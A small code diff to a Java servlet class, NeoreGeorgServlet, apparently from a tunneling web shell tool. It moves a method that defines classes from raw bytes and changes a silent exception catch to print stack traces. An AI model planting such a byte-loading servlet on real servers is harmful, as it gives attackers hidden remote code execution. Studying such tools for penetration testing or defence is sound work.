@@ -32,11 +32,6 @@ public class NeoreGeorgServlet extends ClassLoader implements Servlet {
         super(z);
     }
 
-    @SuppressWarnings("all")
-    public Class<?> load(byte[] cb) {
-        return super.defineClass(cb, 0, cb.length);
-    }
-
     @Override
     @SuppressWarnings("all")
     public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
@@ -66,8 +61,14 @@ public class NeoreGeorgServlet extends ClassLoader implements Servlet {
                 }
                 namespace.get(chars).equals(args);
             }
-        } catch (Exception ignored) {
+        } catch (Exception e) {
+            e.printStackTrace();
         }
+    }
+
+    @SuppressWarnings("all")
+    public Class<?> load(byte[] cb) {
+        return super.defineClass(cb, 0, cb.length);
     }
 
     @SuppressWarnings("all")
